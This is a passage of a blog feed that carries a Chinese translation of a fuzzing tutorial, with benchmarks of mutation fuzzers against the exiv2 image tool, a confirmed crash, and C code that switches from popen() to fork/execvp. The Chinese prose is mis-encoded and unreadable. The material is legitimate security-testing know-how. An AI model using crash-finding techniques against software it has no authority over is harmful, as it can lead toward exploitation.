class="hljs-number">4.582</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.582</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">io.open</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">4.192</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.192</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedRandom&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.339</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.612</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:617(get_exec_path)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.641</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.309</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:8(get_bytes)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.077</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.822</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1014(wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.432</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.746</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1621(_wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.256</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.735</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:351(register)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.619</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.422</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:234(register)</span>   <span class="hljs-number">350000</span>    <span class="hljs-number">0.380</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.402</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1471(&lt;genexpr&gt;)</span> <span class="hljs-number">12066004</span>    <span class="hljs-number">1.335</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.335</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;getrandbits&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.063</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.222</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1608(_try_wait)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.160</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.160</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.waitpid</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.519</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.143</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:674(__getitem__)</span>  <span class="hljs-number">1691352</span>    <span class="hljs-number">0.902</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.097</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:66(__len__)</span>  <span class="hljs-number">7234121</span>    <span class="hljs-number">1.023</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.023</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;append&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;list&#x27;</span> <span class="hljs-string">objects</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>çœ‹èµ·æ¥æˆ‘ä»¬æ€»å…±èŠ±äº†<code>213s</code>ï¼Œä½†å¹¶æ²¡æœ‰çœŸæ­£å‘ç°ä»»ä½•<code>bug</code>ï¼Œè¿™å¾ˆé—æ†¾ï¼Œä½†å¯èƒ½åªæ˜¯è¿æ°”åŸå› ï¼Œè®©æˆ‘ä»¬åœ¨åŒæ ·çš„æƒ…å†µä¸‹è¿è¡Œæˆ‘ä»¬çš„<code>C++ fuzzer</code>ï¼Œå¹¶ç›‘æµ‹å…¶è¾“å‡ºã€‚</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªå·®ä¸å¤šçš„æ—¶é—´ï¼Œä½†æœ‰å¾ˆå¤§çš„æå‡ã€‚</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# ./blogcpp ~/jpegs/Canon_40D.jpg <span class="hljs-number">50000</span>Execution Time: <span class="hljs-number">170829</span>ms</code></pre><p>è¿™æ˜¯ä¸€ä¸ªç›¸å½“å¤§çš„æå‡ï¼Œ43ç§’ï¼Œè¿™ç¼©çŸ­äº†æˆ‘ä»¬çš„<code>Python fuzzer</code>20%çš„æ—¶é—´</p><p>è®©æˆ‘ä»¬ç»§ç»­è·‘ä¸€æ®µæ—¶é—´çš„<code>C++ fuzzer</code>ï¼Œçœ‹çœ‹æ˜¯å¦æˆ‘ä»¬èƒ½æ‰¾åˆ°ä»»ä½•<code>bugs</code> :)</p><h2 id="Bugs-on-Our-New-Target"><a href="#Bugs-on-Our-New-Target" class="headerlink" title="Bugs on Our New Target!"></a>Bugs on Our New Target!</h2><p>åœ¨å†æ¬¡è¿è¡Œ<code>fuzzer</code>å¤§çº¦<code>10s</code>åï¼Œæˆ‘å¾—åˆ°äº†ä»¥ä¸‹è¿™ä¸ªç»ˆç«¯è¾“å‡ºï¼š</p><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ./blogcpp ~/jpegs/Canon_40D.jpg 1000000</span>Floating Point!</code></pre><p>è¿™ä¼¼ä¹æˆ‘ä»¬æ»¡è¶³äº†<code>a Floating Point exception</code>çš„éœ€æ±‚</p><p>æˆ‘ä»¬åº”è¯¥æœ‰ä¸€ä¸ªå¾ˆæ£’çš„<code>jpg</code>åœ¨<code>cppcrashes</code>æ–‡ä»¶å¤¹ä¸­ç­‰ç€æˆ‘ä»¬</p><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/cppcrashes</span><span class="hljs-comment"># ls</span>crash.<span class="hljs-number">522</span>.jpg</code></pre><p>è®©æˆ‘ä»¬é€šè¿‡å¯¹è¿™ä¸ªæ ·æœ¬è¿è¡Œ<code>exiv2</code>æ¥è¯å®è¿™ä¸ªé”™è¯¯ã€‚</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@kali:~/cppcrashes# exiv<span class="hljs-number">2</span> pr -v crash.<span class="hljs-number">522</span>.jpg<span class="hljs-attribute">File</span> <span class="hljs-number">1</span>/<span class="hljs-number">1</span>: crash.<span class="hljs-number">522</span>.jpg<span class="hljs-attribute">Error</span>: Offset of directory Image, entry <span class="hljs-number">0</span>x<span class="hljs-number">011</span>b is out of bounds: Offset = <span class="hljs-number">0</span>x<span class="hljs-number">080000</span>ae; truncating the entry<span class="hljs-attribute">Warning</span>: Directory Image, entry <span class="hljs-number">0</span>x<span class="hljs-number">8825</span> has unknown Exif (TIFF) type <span class="hljs-number">68</span>; setting type size <span class="hljs-number">1</span>.<span class="hljs-attribute">Warning</span>: Directory Image, entry <span class="hljs-number">0</span>x<span class="hljs-number">8825</span> doesn&#x27;t look like a sub-IFD.<span class="hljs-attribute">File</span> name       : crash.<span class="hljs-number">522</span>.jpg<span class="hljs-attribute">File</span> size       : <span class="hljs-number">7958</span> Bytes<span class="hljs-attribute">MIME</span> type       : image/jpeg<span class="hljs-attribute">Image</span> size      : <span class="hljs-number">100</span> x <span class="hljs-number">68</span><span class="hljs-attribute">Camera</span> make     : Aanon<span class="hljs-attribute">Camera</span> model    : Canon EOS <span class="hljs-number">40</span>D<span class="hljs-attribute">Image</span> timestamp : <span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span><span class="hljs-attribute">Image</span> number    : <span class="hljs-attribute">Exposure</span> time   : <span class="hljs-number">1</span>/<span class="hljs-number">160</span> s<span class="hljs-attribute">Aperture</span>        : F<span class="hljs-number">7</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Floating</span> point exception</code></pre><p>æˆ‘ä»¬ç¡®å®å‘ç°äº†ä¸€ä¸ªæ–°çš„<code>bug</code>! è¿™å®åœ¨æ˜¯å¤ªä»¤äººå…´å¥‹äº†ï¼Œæˆ‘ä»¬åº”è¯¥å‘<code>Github</code>ä¸Šçš„<code>exiv2</code>å¼€å‘è€…å‘å¸ƒä¸€ä»½<code>bug report</code></p><p>ä¸ºäº†æ‰¾ç‚¹æœ‰è¶£çš„ï¼Œè®©æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹æˆ‘ä»¬çš„åŸå§‹<code>fuzzer</code>åœ¨50,000æ¬¡è¿­ä»£ä¸­çš„è¡¨ç°ï¼š</p><pre><code class="hljs basic"><span class="hljs-symbol">123052109 </span>function <span class="hljs-keyword">calls</span> (<span class="hljs-number">123001828</span> primitive <span class="hljs-keyword">calls</span>) in <span class="hljs-number">6243.939</span> seconds</code></pre><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œ<code>6243s</code>æ˜æ˜¾æ¯”æˆ‘ä»¬çš„<code>C++ fuzzer</code>åŸºå‡†çš„<code>170s</code>æ…¢</p><h2 id="Addendum-15-May-2020"><a href="#Addendum-15-May-2020" class="headerlink" title="Addendum 15/May/2020"></a>Addendum 15/May/2020</h2><p>ä»…è¯•è¯•é€šè¿‡ç§»æ¤<code>C++ fuzzer</code>åˆ°<code>C</code>ä¸Šï¼Œæˆ‘è‡ªå·±ä¹Ÿåšäº†ä¸€äº›é€‚å½“çš„æ”¹è¿›ï¼Œå…¶ä¸­ä¸€ä¸ªæˆ‘æ‰€ä¿®æ”¹çš„é€»è¾‘ä¸ºä»…ä»åŸå§‹æœ‰æ•ˆçš„å›¾åƒä¸­æ”¶é›†ä¸€æ¬¡æ•°æ®ï¼Œç„¶ååœ¨æ¯æ¬¡<code>fuzzing</code>è¿­ä»£æŠŠæ•°æ®å¤åˆ¶åˆ°æ–°åˆ†é…çš„ç¼“å†²åŒºï¼Œä¹‹åå†åœ¨æ–°åˆ†é…çš„ç¼“å†²åŒºä¸­æ‰§è¡Œå˜å¼‚æ“ä½œï¼Œè¿™ä¸ªä¸<code>C++ fuzzer</code>åŸºæœ¬ç›¸åŒçš„<code>C</code>ç‰ˆæœ¬æ¯”<code>C++</code>æ‰§è¡Œçš„æ•ˆæœæ›´å¥½ï¼Œè¿™æ˜¯è¿™ä¸¤ä¸ªè¿­ä»£<code>200k</code>æ¬¡ä¹‹é—´çš„å¯¹æ¯”ï¼ˆä½ å¯ä»¥å¿½ç•¥è¿™ä¸ª<code>crash</code>çš„å‘ç°æ•°ï¼Œå› ä¸ºè¿™ä¸ª<code>fuzzer</code>æ˜¯ç›¸å½“æ„šè ¢ä¸”100%éšæœºçš„ï¼‰ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">h0mbre</span>:~$ time ./cppfuzz Canon_<span class="hljs-number">40</span>D.jpg <span class="hljs-number">200000</span><span class="hljs-section">&lt;snipped_results&gt;</span><span class="hljs-attribute">real</span>    <span class="hljs-number">10</span>m<span class="hljs-number">45</span>.<span class="hljs-number">371</span>s<span class="hljs-attribute">user</span>    <span class="hljs-number">7</span>m<span class="hljs-number">14</span>.<span class="hljs-number">561</span>s<span class="hljs-attribute">sys</span>     <span class="hljs-number">3</span>m<span class="hljs-number">10</span>.<span class="hljs-number">529</span>s<span class="hljs-attribute">h0mbre</span>:~$ time ./cfuzz Canon_<span class="hljs-number">40</span>D.jpg <span class="hljs-number">200000</span><span class="hljs-section">&lt;snipped_results&gt;</span><span class="hljs-attribute">real</span>    <span class="hljs-number">10</span>m<span class="hljs-number">7</span>.<span class="hljs-number">686</span>s<span class="hljs-attribute">user</span>    <span class="hljs-number">7</span>m<span class="hljs-number">27</span>.<span class="hljs-number">503</span>s<span class="hljs-attribute">sys</span>     <span class="hljs-number">2</span>m<span class="hljs-number">20</span>.<span class="hljs-number">843</span>s</code></pre><p>å› æ­¤ï¼Œåœ¨è¶…è¿‡<code>200k</code>æ¬¡çš„è¿­ä»£ä¸­ï¼Œæˆ‘ä»¬ä»¥èŠ‚çœ<code>35-40s</code>ç»“æŸæ”¹è¿›ï¼Œè¿™ä¸ªåœ¨æˆ‘ä»¬çš„æµ‹è¯•ä¸­æ˜¯ååˆ†å…¸å‹çš„ï¼Œå› æ­¤ï¼Œä»…ä»…é€šè¿‡å°‘é‡çš„é€»è¾‘æ›´æ”¹å’Œä½¿ç”¨è¾ƒå°‘çš„<code>C++</code>æä¾›çš„æŠ½è±¡æ¥å£ä¸­ï¼Œæˆ‘ä»¬èŠ‚çœäº†å¤§é‡çš„<code>sys</code>çš„æ—¶é—´ï¼Œæˆ‘ä»¬çš„é€Ÿåº¦å¤§æ¦‚æå‡äº†<code>5%</code></p><h3 id="Monitoring-Child-Process-Exit-Status"><a href="#Monitoring-Child-Process-Exit-Status" class="headerlink" title="Monitoring Child Process Exit Status"></a>Monitoring Child Process Exit Status</h3><p>åœ¨å®Œæˆ<code>C</code>çš„ç¿»è¯‘åï¼Œæˆ‘å»æ¨ç‰¹è¯¢é—®äº†æœ‰å…³æ€§èƒ½æ”¹è¿›çš„å»ºè®®ï¼Œ<a href="https://twitter.com/lcamtuf">@lcamtuf</a>ï¼Œ<code>AFL</code>çš„åˆ›å»ºè€…ï¼Œå‘æˆ‘è§£é‡Šè¯´ï¼Œæˆ‘ä¸åº”è¯¥åœ¨æˆ‘çš„ä»£ç ä¸­ç”¨<code>popen</code>ï¼Œå› ä¸ºå®ƒä¼šç”Ÿæˆä¸€ä¸ª<code>shell</code>å¹¶ä¸”æ€§èƒ½å¾ˆå·®ï¼Œè¿™æ˜¯æˆ‘å¯»æ±‚å¸®åŠ©çš„ä»£ç ç‰‡æ®µï¼š</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exif</span><span class="hljs-params">(<span class="hljs-keyword">int</span> iteration)</span> </span>&#123;        FILE *fileptr;        <span class="hljs-comment">//fileptr = popen(&quot;exif_bin target.jpeg -verbose &gt;/dev/null 2&gt;&amp;1&quot;, &quot;r&quot;);</span>    fileptr = popen(<span class="hljs-string">&quot;exiv2 pr -v mutated.jpeg &gt;/dev/null 2&gt;&amp;1&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">int</span> status = WEXITSTATUS(pclose(fileptr));    <span class="hljs-keyword">switch</span>(status) &#123;        <span class="hljs-keyword">case</span> <span class="hljs-number">253</span>:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            crashes++;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r[&gt;] Crashes: %d&quot;</span>, crashes);            fflush(<span class="hljs-built_in">stdout</span>);            <span class="hljs-keyword">char</span> command[<span class="hljs-number">50</span>];            <span class="hljs-built_in">sprintf</span>(command, <span class="hljs-string">&quot;cp mutated.jpeg ccrashes/crash.%d.%d&quot;</span>,             iteration,status);            system(command);            <span class="hljs-keyword">break</span>;    &#125;&#125;</code></pre><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>popen()</code>ï¼Œè¿è¡Œä¸€ä¸ª<code>shell-command</code>ï¼Œç„¶åå…³é—­å­è¿›ç¨‹çš„æ–‡ä»¶æŒ‡é’ˆï¼Œè¿”å›ç”¨<code>WEXITSTATUS</code>å®ç›‘æ§çš„<code>exit-status</code>ï¼Œæˆ‘æ­£åœ¨è¿‡æ»¤æ‰ä¸€äº›æˆ‘ä¸å…³å¿ƒçš„<code>exit codes</code>ï¼Œå¦‚253ã€0å’Œ1ï¼Œå¹¶å¸Œæœ›çœ‹åˆ°ä¸€äº›ä¸æˆ‘ä»¬å·²ç»ç”¨<code>C++ fuzzer</code>å‘ç°çš„<code>floating point errors</code>æœ‰å…³çš„ä»£ç ï¼Œæˆ–ç”šè‡³å¯èƒ½æ˜¯ä¸€ä¸ª<code>segfault</code>ï¼Œ<code>@lcamtuf</code>å»ºè®®æˆ‘ä¸ä½¿ç”¨<code>popen()</code>ï¼Œè€Œæ˜¯è°ƒç”¨<code>fork()</code>æ¥ç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œ<code>execvp()</code>è®©å­è¿›ç¨‹æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œæœ€åä½¿ç”¨<code>waitpid()</code>æ¥ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢å¹¶è¿”å›é€€å‡ºçŠ¶æ€ã€‚</p><p>ç”±äºæˆ‘ä»¬åœ¨è¿™ä¸ª<code>syscall</code>è·¯å¾„ä¸­æ²¡æœ‰ä¸€ä¸ªåˆé€‚çš„<code>shell</code>ï¼Œæˆ‘ä¸å¾—ä¸åŒæ—¶æ‰“å¼€ä¸€ä¸ª<code>/dev/null</code>çš„å¥æŸ„ï¼Œå¹¶è°ƒç”¨<code>dup2()</code>è·¯ç”±<code>stdout</code>å’Œ<code>stderr</code>åˆ°<code>/dev/null</code>ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸å…³å¿ƒå‘½ä»¤è¾“å‡ºï¼Œæˆ‘è¿˜ä½¿ç”¨äº†<code>WTERMSIG</code>å®æ¥æ£€ç´¢åœ¨<code>WIFSIGNALED</code>å®è¿”å›çœŸæ—¶ç»ˆæ­¢å­è¿›ç¨‹çš„ä¿¡å·ï¼Œè¿™å°†è¡¨æ˜æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª<code>segfault</code>æˆ–<code>floating point exception</code>ï¼Œç­‰ç­‰ï¼Œæ‰€ä»¥ç°åœ¨ï¼Œæˆ‘ä»¬æ›´æ–°çš„å‡½æ•°çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exif</span><span class="hljs-params">(<span class="hljs-keyword">int</span> iteration)</span> </span>&#123;        <span class="hljs-keyword">char</span>* file = <span class="hljs-string">&quot;exiv2&quot;</span>;    <span class="hljs-keyword">char</span>* argv[<span class="hljs-number">4</span>];    argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;pr&quot;</span>;    argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-v&quot;</span>;    argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;mutated.jpeg&quot;</span>;    argv[<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">pid_t</span> child_pid;    <span class="hljs-keyword">int</span> child_status;    child_pid = fork();    <span class="hljs-keyword">if</span> (child_pid == <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">// this means we&#x27;re the child process</span>        <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_WRONLY);        <span class="hljs-comment">// dup both stdout and stderr and send them to /dev/null</span>        dup2(fd, <span class="hljs-number">1</span>);        dup2(fd, <span class="hljs-number">2</span>);        close(fd);        execvp(file, argv);        <span class="hljs-comment">// shouldn&#x27;t return, if it does, we have an error with the command</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Unknown command for execvp, exiting...\n&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">// this is run by the parent process</span>        <span class="hljs-keyword">do</span> &#123;            <span class="hljs-keyword">pid_t</span> tpid = waitpid(child_pid, &amp;child_status, WUNTRACED |             WCONTINUED);            <span class="hljs-keyword">if</span> (tpid == <span class="hljs-number">-1</span>) &#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Waitpid failed!\n&quot;</span>);                perror(<span class="hljs-string">&quot;waitpid&quot;</span>);            &#125;            <span class="hljs-keyword">if</span> (WIFEXITED(child_status)) &#123;                <span class="hljs-comment">//printf(&quot;WIFEXITED: Exit Status: %d\n&quot;, WEXITSTATUS(child_status));</span>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(child_status)) &#123;                crashes++;                <span class="hljs-keyword">int</span> exit_status = WTERMSIG(child_status);                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r[&gt;] Crashes: %d&quot;</span>, crashes);                fflush(<span class="hljs-built_in">stdout</span>);                <span class="hljs-keyword">char</span> command[<span class="hljs-number">50</span>];                <span class="hljs-built_in">sprintf</span>(command, <span class="hljs-string">&quot;cp mutated.jpeg ccrashes/%d.%d&quot;</span>, iteration,                 exit_status);                system(command);            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSTOPPED(child_status)) &#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WIFSTOPPED: Exit Status: %d\n&quot;</span>, WSTOPSIG(child_status));            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFCONTINUED(child_status)) &#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WIFCONTINUED: Exit Status: Continued.\n&quot;</span>);            &#125;        &#125; <span class="hljs-keyword">while</span> (!WIFEXITED(child_status) &amp;&amp; !WIFSIGNALED(child_status));    &#125;&#125;</code></pre><p>ä½ å¯ä»¥çœ‹åˆ°ï¼Œè¿™æå¤§åœ°æé«˜äº†æˆ‘ä»¬<code>200k</code>æ¬¡è¿­ä»£åŸºå‡†æµ‹è¯•çš„æ€§èƒ½ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">h0mbre</span>:~$ time ./cfuzz<span class="hljs-number">2</span> Canon_<span class="hljs-number">40</span>D.jpg <span class="hljs-number">200000</span><span class="hljs-section">&lt;snipped_results&gt;</span><span class="hljs-attribute">real</span>    <span class="hljs-number">8</span>m<span class="hljs-number">30</span>.<span class="hljs-number">371</span>s<span class="hljs-attribute">user</span>    <span class="hljs-number">6</span>m<span class="hljs-number">10</span>.<span class="hljs-number">219</span>s<span class="hljs-attribute">sys</span>     <span class="hljs-number">2</span>m<span class="hljs-number">2</span>.<span class="hljs-number">098</span>s</code></pre><h3 id="Summary-of-Results"><a href="#Summary-of-Results" class="headerlink" title="Summary of Results"></a>Summary of Results</h3><ul><li>C++ Fuzzer â€“ 310 iterations/sec</li><li>C Fuzzer â€“ 329 iterations/sec (+ 6%)</li><li>C Fuzzer 2.0 â€“ 392 iterations/sec (+ 26%)</li></ul><p>æ„Ÿè°¢<a href="https://twitter.com/lcamtuf">@lcamtuf</a>å’Œ<a href="https://twitter.com/carste1n">@carste1n</a>çš„å¸®åŠ©</p><p>æˆ‘å·²ç»æŠŠä»£ç ä¸Šä¼ åˆ°<code>https://github.com/h0mbre/Fuzzing/tree/master/JPEGMutation</code></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing Like A Caveman è¯‘</title>
    <link href="/2022/04/28/fuzzing%20like%20a%20caveman/"/>
    <url>/2022/04/28/fuzzing%20like%20a%20caveman/</url>
    
    <content type="html"><![CDATA[<p>åŸæ–‡ä¸º <a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman">Fuzzing-Like-A-Caveman</a>ï¼Œæœ¬æ–‡ç« ä»…ä¸ºä¸ªäººç†è§£çš„ç¿»è¯‘å’Œå¤‡ä»½</p><h2 id="Intoduction"><a href="#Intoduction" class="headerlink" title="Intoduction"></a>Intoduction</h2><p>åœ¨è¿‡å»çš„å‡ ä¸ªæœˆé‡Œï¼Œæˆ‘ä¸€ç›´åœ¨è¢«åŠ¨åœ°æ¶ˆåŒ–å¤§é‡ä¸æ¨¡ç³Šæµ‹è¯•ç›¸å…³çš„ææ–™ï¼Œå› ä¸ºæˆ‘ä¸»è¦å°è¯•å°†æˆ‘çš„<code>Windows exploitation game</code>ä»<code>Noob-level</code>æé«˜åˆ°<code>1%-Less-Noob-Level</code>ï¼Œè€Œä¸”æˆ‘å‘ç°å®ƒç›¸å½“çš„è¿·äººï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†å‘ä½ ä»¬å±•ç¤ºå¦‚ä½•åˆ›å»ºä¸€ä¸ªéå¸¸ç®€å•å˜å¼‚çš„<code>fuzzer</code>ï¼Œå¸Œæœ›æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ª<code>fuzzer</code>åœ¨ä¸€äº›å¼€æºé¡¹ç›®ä¸­æ‰¾åˆ°ä¸€äº›<code>crashes</code>ã€‚</p><p>æˆ‘ä»¬å°†åˆ›å»ºçš„è¿™ä¸ª<code>fuzzer</code>æ˜¯è·Ÿéšç€ <a href="https://twitter.com/gynvael?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">@gynvaelâ€™s fuzzing tutorial on YouTube</a>å®ç°çš„ï¼Œæˆ‘ä¸çŸ¥é“<code>Gynvael</code>æœ‰è§†é¢‘ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘æœ‰å‡ åä¸ªå°æ—¶çš„å†…å®¹å¯ä»¥æ·»åŠ åˆ°æ— æ­¢å°½çš„<code>watch/read</code>åˆ—è¡¨ä¸­ã€‚</p><p>æˆ‘ä¹Ÿå¿…é¡»è¦è¯´<a href="https://www.youtube.com/user/gamozolabs/videos">Brandon Faulkâ€™s fuzzing streams</a>æ˜¯éå¸¸å¥½çš„ï¼Œè™½ç„¶æˆ‘ä¸èƒ½ç†è§£è¿‘ä¹<code>99%</code>çš„<code>Brandon says</code>æ‰€è¯´çš„äº‹æƒ…ï¼Œä½†æ˜¯è¿™äº›è§†é¢‘çš„å†…å®¹æ˜¯å¸å¼•äººçš„ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä¸ªäººæœ€å–œæ¬¢çš„æ˜¯ä»–å¯¹<code>calc.exe</code>å’Œ<code>c-tags</code>çš„<code>fuzzing</code>ï¼Œä»–ä¹Ÿæœ‰ä¸€ä¸ªå…³äº<code>fuzzing</code>æ¦‚å¿µç‰¹åˆ«å¥½çš„ä»‹ç»çš„è§†é¢‘ï¼š<a href="https://www.youtube.com/watch?v=SngK4W4tVc0">NYU Fuzzing Talk</a></p><h2 id="Picking-a-Target"><a href="#Picking-a-Target" class="headerlink" title="Picking a Target"></a>Picking a Target</h2><p>æˆ‘æƒ³æ‰¾ä¸€ä¸ªç”¨<code>C</code>æˆ–è€…<code>C++</code>å†™çš„ä»æ–‡ä»¶ä¸­è§£ææ•°æ®çš„<code>binary</code>ï¼Œæˆ‘æœ€å…ˆæ‰¾åˆ°çš„å…¶ä¸­ä¸€ä¸ªå°±æ˜¯ä»<code>images</code>ä¸­è§£æ<code>Exif</code>æ•°æ®çš„<code>binaries</code>ï¼Œæˆ‘ä»¬ä¹Ÿæƒ³é€‰ä¸€ä¸ªå‡ ä¹æ²¡æœ‰å®‰å…¨éšæ‚£çš„ç›®æ ‡ï¼Œå› ä¸ºæˆ‘ä»¬å°†ä¼šå®æ—¶çš„å…¬å¸ƒè¿™äº›å‘ç°ã€‚</p><p>ä»<a href="https://www.media.mit.edu/pia/Research/deepview/exif.html">exif</a>å¯çŸ¥ï¼ŒåŸºæœ¬ä¸Šï¼Œ<code>Exif</code>æ–‡ä»¶æ ¼å¼æ˜¯è·Ÿ<code>JPEG</code>æ–‡ä»¶æ ¼å¼æ˜¯ç›¸åŒçš„ï¼Œ<code>Exif</code>æ’å…¥ä¸€äº›<code>image/digicam</code>ä¿¡æ¯æ•°æ®å’Œç¼©ç•¥å›¾ (<code>thumbnail image</code>) åˆ°<code>JPEG</code>ä¸­ä»¥ç¬¦åˆ<code>JPEG</code>çš„è§„èŒƒï¼Œå› æ­¤ä½ å¯ä»¥é€šè¿‡<code>JEPG</code>å…¼å®¹çš„æµè§ˆå™¨/å›¾ç‰‡æŸ¥çœ‹å™¨/å›¾ç‰‡ä¿®é¥°è½¯ä»¶ç­‰æŸ¥çœ‹<code>Exif</code>æ ¼å¼çš„æ–‡ä»¶ï¼Œå°±åƒé€šå¸¸æŸ¥çœ‹<code>JPEG</code>æ–‡ä»¶ä¸€æ ·ã€‚</p><p>å› æ­¤ï¼Œ<code>Exif</code>å¯å°†å…ƒæ•°æ®ç±»å‹æ’å…¥åˆ°ç¬¦åˆ<code>JPEG</code>è§„èŒƒçš„æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”å¸‚é¢ä¸Šå­˜åœ¨ä¸å°‘æœ‰åŠ©äºè§£æè¿™äº›æ•°æ®çš„<code>programs/utilities</code>ã€‚</p><h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting 